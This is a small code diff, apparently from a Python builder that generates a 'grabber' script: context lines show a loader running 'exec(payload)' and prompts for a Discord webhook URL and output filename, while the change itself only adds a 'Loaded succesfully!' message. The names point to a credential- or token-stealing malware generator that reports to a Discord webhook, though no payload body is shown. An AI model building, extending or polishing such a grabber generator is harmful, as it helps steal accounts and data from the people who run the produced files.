@@ -70,6 +70,7 @@ exec(payload)
     return loader_code.strip()
 
 def main():
+    print("Loaded succesfully!")
     webhook = input("Enter Discord webhook URL: ").strip()
     filename = input("Output filename (without .py): ").strip() or "grabber"
 
